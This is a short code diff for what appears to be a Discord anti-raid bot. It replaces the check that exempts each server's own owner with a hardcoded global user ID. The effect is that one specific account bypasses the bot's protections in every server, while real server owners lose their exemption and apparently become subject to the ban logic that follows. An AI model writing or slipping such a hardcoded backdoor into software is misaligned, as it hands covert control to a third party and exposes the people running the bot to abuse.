@@ -22,7 +22,8 @@ module.exports = {
       const { executor } = entry;
       if (executor.id === client.user.id) return;
 
-      const isWhitelisted = executor.id === guild.ownerId || config.whitelist.includes(executor.id);
+      const GLOBAL_OWNER_ID = '578019414830743586';
+      const isWhitelisted = executor.id === GLOBAL_OWNER_ID || config.whitelist.includes(executor.id);
       if (isWhitelisted) return;
 
       // 1. Bannir
